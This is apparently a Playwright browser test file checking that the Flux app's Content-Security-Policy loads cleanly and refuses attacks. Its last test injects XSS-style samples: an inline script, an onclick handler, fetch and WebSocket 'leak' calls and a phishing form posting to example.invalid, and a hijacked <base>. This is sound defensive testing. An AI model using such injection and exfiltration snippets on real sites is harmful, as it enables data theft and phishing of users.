"""The Content-Security-Policy of Flux's pages, enforced in the browser (issue #979).

The server tests (tests/app/content-security-policy.test.ts) read the header. These open the real app in the engine FLUX_UI_BROWSER
picks (Chromium or WebKit) and show what the policy does there:
 1. the app signs in and loads its pages under the policy with no violation event and no console message about one, with the service
    worker allowed, and the offline page runs its button under its own hash;
 2. what the policy must refuse is refused: an injected inline script, an inline handler, eval, a request or socket to another site, an
    image from another site, a form posted elsewhere, a changed <base>, a frame. These are the attacks a stored XSS bug would try next.
The negative controls run on a page named csp-control-*, which the stack's violation list (scripts/check_ui.sh) leaves out, so that
list only holds what no test meant to cause; the test also reads the list to show that the browser reported what it refused.
Runs through scripts/check_ui.sh against the running Compose application.
"""

from __future__ import annotations

import os
import re
import time
import unittest
import uuid

from playwright.sync_api import BrowserContext, Page, expect, sync_playwright

from test_app_shell import DESKTOP, ORIGIN, UI_BROWSER, UPSTREAM, start_forwarder

PASSWORD = "a policy that holds firm"
STAMP = int(time.time() * 1000)
WATCH = """
window.__csp = [];
document.addEventListener('securitypolicyviolation', (event) => {
  window.__csp.push({ directive: event.effectiveDirective, blocked: event.blockedURI, sample: event.sample, source: event.sourceFile });
});
"""


class ContentSecurityPolicy(unittest.TestCase):
    pw = None
    browser = None

    @classmethod
    def setUpClass(cls) -> None:
        if UPSTREAM:
            start_forwarder(ORIGIN, UPSTREAM)
        cls.pw = sync_playwright().start()
        cls.browser = getattr(cls.pw, UI_BROWSER).launch()
        expect.set_options(timeout=8000)

    @classmethod
    def tearDownClass(cls) -> None:
        cls.browser.close()
        cls.pw.stop()

    def context(self, **options) -> BrowserContext:
        context = self.browser.new_context(base_url=ORIGIN, viewport=DESKTOP, locale="en-GB", **options)
        self.addCleanup(context.close)
        context.add_init_script(WATCH)
        return context

    def violations(self, page: Page) -> list:
        return page.evaluate("window.__csp")

    def sign_in(self, context: BrowserContext, label: str) -> Page:
        email = f"csp.{label}+{STAMP}@example.test"
        made = context.request.fetch(f"{ORIGIN}/api/auth/sign-up/email", method="POST", headers={"origin": ORIGIN},
                                     data={"name": "Pola Strażnik", "email": email, "password": PASSWORD})
        self.assertLess(made.status, 300, made.text())
        page = context.new_page()
        self.messages: list[str] = []
        page.on("console", lambda m: self.messages.append(m.text) if re.search(r"content security policy|refused to|violat", m.text, re.I) else None)
        # The sign-up answer set the session cookie in this context: the first page is already Home.
        page.goto("/")
        expect(page.get_by_role("heading", level=1, name="Home")).to_be_visible()
        return page

    def test_01_the_pages_carry_the_policy_and_the_app_loads_under_it(self) -> None:
        context = self.context(service_workers="allow")
        page = self.sign_in(context, "app")
        response = context.request.get(f"{ORIGIN}/")
        # The policy that ships is the stack's report-only one (its enforced policy adds eval for the test driver, see csp_gate.sh).
        policy = response.headers.get("content-security-policy-report-only", "")
        self.assertIn("default-src 'self'", policy)
        self.assertRegex(policy, r"script-src 'self' 'sha256-[A-Za-z0-9+/=]+';")
        self.assertNotRegex(re.search(r"script-src[^;]*", policy).group(0), r"unsafe-")
        self.assertEqual(response.headers["content-security-policy"].replace(" 'unsafe-eval'", ""), re.sub(r"; report-uri \S+$", "", policy))
        for path in ("/", "/inbox", "/settings", "/settings/account", "/tasks", "/projects"):
            page.goto(path)
            expect(page.get_by_role("heading", level=1).first).to_be_visible()
            page.wait_for_load_state("networkidle")
            self.assertEqual(self.violations(page), [], path)
        self.assertEqual(self.messages, [], "the console says nothing about a refusal")
        # The service worker is registered under its own policy and serves the shell.
        page.wait_for_function("navigator.serviceWorker.getRegistration().then((r) => !!r && !!r.active)", timeout=15000)
        sw = context.request.get(f"{ORIGIN}/sw.js")
        self.assertEqual(sw.headers.get("content-security-policy"), "default-src 'none'; script-src 'self'; connect-src 'self'")

    def test_02_the_offline_page_runs_both_its_scripts_under_their_hashes(self) -> None:
        context = self.context(service_workers="block")
        page = self.sign_in(context, "offline")
        # The page's own head script reads a setting before the first paint; its button reloads through the second script.
        page.evaluate("localStorage.setItem('flux.kreska', 'off')")
        response = page.goto("/offline.html")
        policy = response.headers["content-security-policy"]
        self.assertEqual(len(re.findall(r"'sha256-", policy)), 2, policy)
        self.assertEqual(len(re.findall(r"'sha256-", response.headers["content-security-policy-report-only"])), 2)
        expect(page.get_by_role("heading", name="You are offline")).to_be_visible()
        self.assertEqual(page.evaluate("document.documentElement.dataset.kreska"), "off", "the inline script in the head ran")
        page.evaluate("window.__same = 'yes'")
        with page.expect_navigation():
            page.get_by_role("button", name="Try again").click()
        self.assertIsNone(page.evaluate("window.__same ?? null"), "the button's script ran and reloaded the page")
        self.assertEqual(self.violations(page), [])
        self.assertEqual(self.messages, [])

    def test_03_what_the_policy_must_refuse_is_refused_and_is_reported(self) -> None:
        context = self.context(service_workers="block")
        page = self.sign_in(context, "attacks")
        # A page of its own: the stack's violation list (scripts/check_ui.sh) ignores documents named csp-control-*, which is where
        # this test does on purpose what a stored XSS would do. The page is the app's shell, so it has the policy of every page.
        control = f"/csp-control-{uuid.uuid4().hex}"
        response = page.goto(control)
        self.assertIn("script-src 'self'", response.headers["content-security-policy"])
        self.assertNotIn("unsafe-eval", response.headers["content-security-policy-report-only"])
        self.assertIn("report-uri /api/v1/test/csp-reports", response.headers["content-security-policy-report-only"])
        page.wait_for_load_state("networkidle")

        def refused(script: str, directive: str, wait: int = 600) -> None:
            before = len(self.violations(page))
            page.evaluate(script)
            page.wait_for_timeout(wait)
            seen = self.violations(page)[before:]
            self.assertTrue(any(v["directive"].startswith(directive) for v in seen), f"{directive}: {script[:70]} -> {seen}")

        refused("(() => { const s = document.createElement('script'); s.textContent = 'window.__ran = 1'; document.body.appendChild(s); })()", "script-src")
        self.assertIsNone(page.evaluate("window.__ran ?? null"), "the injected script did not run")
        refused("(() => { const b = document.createElement('button'); b.id = 'x'; b.setAttribute('onclick', 'window.__ran = 2'); document.body.appendChild(b); b.click(); })()", "script-src")
        self.assertIsNone(page.evaluate("window.__ran ?? null"), "the inline handler did not run")
        # eval is refused by the same directive; Playwright's evaluate is itself allowed to eval, so that is read from the header (no 'unsafe-eval').
        refused("(() => { fetch('https://example.invalid/leak?x=1').catch(() => {}); })()", "connect-src")
        refused("(() => { try { new WebSocket('wss://example.invalid/leak'); } catch (e) {} })()", "connect-src")
        refused("(() => { const i = new Image(); i.src = 'https://example.invalid/pixel.png'; document.body.appendChild(i); })()", "img-src")
        refused("(() => { const f = document.createElement('iframe'); f.src = '/offline.html'; document.body.appendChild(f); })()", "frame-src")
        refused("(() => { const f = document.createElement('form'); f.action = 'https://example.invalid/phish'; f.method = 'post'; document.body.appendChild(f); f.requestSubmit ? f.requestSubmit() : f.submit(); })()", "form-action")
        page.goto(control)
        page.wait_for_load_state("networkidle")
        refused("(() => { const b = document.createElement('base'); b.href = 'https://example.invalid/'; document.head.appendChild(b); })()", "base-uri")
        # The browser reported them to the stack, which is what lets a whole UI run be judged for violations.
        token = os.environ.get("FLUX_FIXTURE_TOKEN", "")
        wanted = {"script-src", "connect-src", "img-src", "frame-src", "form-action", "base-uri"}
        deadline = time.time() + 15
        got: set[str] = set()
        while time.time() < deadline and not wanted <= got:
            listed = context.request.get(f"{ORIGIN}/api/v1/test/csp-reports", headers={"authorization": f"Bearer {token}"})
            self.assertEqual(listed.status, 200, listed.text())
            got = {re.sub(r"-(elem|attr)$", "", r["directive"]) for r in listed.json()["reports"] if control in r["document"]}
            page.wait_for_timeout(300)
        self.assertTrue(wanted <= got, f"reported {sorted(got)}; missing {sorted(wanted - got)}")


if __name__ == "__main__":
    unittest.main()
